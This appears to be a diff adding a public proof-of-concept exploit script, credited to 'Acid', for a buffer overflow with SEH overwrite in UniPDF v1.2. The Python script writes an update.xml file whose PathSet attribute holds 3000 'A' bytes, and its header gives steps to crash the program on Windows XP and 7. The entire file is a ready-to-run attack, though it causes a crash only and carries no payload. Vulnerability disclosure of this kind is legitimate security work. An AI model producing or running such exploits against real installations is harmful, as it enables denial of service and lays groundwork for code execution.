@@ -1,0 +1,33 @@
+# Exploit Title: UniPDF v1.2 BufferOverflow, SEH overwrite DoS PoC
+# Author : Avinash Kumar Thapa "-Acid"
+# Date of Testing :  25th April 2015
+# Tested On : Windows XP- Service Pack 3 && Windows 7 Home Basic
+# Vendor Homepage: http://unipdf.com/
+# Software Link: http://unipdf.com/file/unipdf-setup.exe
+# Steps to reproduce the Crash is:
+#   Step 1: Run the POC
+#   Step 2: Go to local Disk C:\Program Files\UniPDF and copy the POC there
+#   Step 3 : Run the UniPdf.exe 
+
+buff2 = "\x41" * 3000
+crash = "      <config>\n"
+crash +=  "         <UserDefine>\n"
+crash  +=               "<Language ID=\"0\" />\n"
+crash +=                "<Path PathSet=\""+buff2+"\" Path=\"\" />\n"
+crash +=                "<ImageFormat set=\"2\" />\n"
+crash +=                "<Res set=\"96\" />\n"
+crash +=                "<bit set=\"24\" />\n"
+crash +=                "<Prefix set=\"\" />\n"
+crash +=                "<Doc set=\"1\" />\n"
+crash +=                "<Help set=\"1\" />\n"
+crash +=             "</UserDefine>\n"
+crash +=        "</config>\n"
+
+print "POC Created By -Acid"
+print " acid.exploit@gmail.com" 
+file = open("update.xml","w")
+file.write(crash)
+file.close()
+
+
+
